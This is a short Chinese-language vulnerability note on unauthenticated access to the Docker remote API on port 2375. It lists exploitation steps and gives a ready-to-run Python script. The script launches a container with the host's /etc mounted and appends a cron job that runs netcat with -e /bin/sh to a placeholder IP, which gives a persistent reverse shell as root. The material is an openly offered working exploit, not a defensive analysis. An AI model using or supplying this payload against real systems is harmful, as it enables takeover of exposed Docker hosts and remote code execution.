# docker
## docker未授权访问漏洞
### 漏洞说明
docker swarm是docker下的分布化应用的本地集群，默认开放2375监听

## 涉及范围
/
## 验证方法
pocsuite:`poc_docker_unauth.py`

## 利用方法
1. 随意启动一个容器，并将宿主机的`/etc`目录挂载到容器中，便可以任意读写文件了。
2. 我们可以将命令写入crontab配置文件，进行反弹shell。
3. 通过shell写入文件到挂载目录中，实际则写入了宿主机目录

```python
import docker

client = docker.DockerClient(base_url='http://your-ip:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```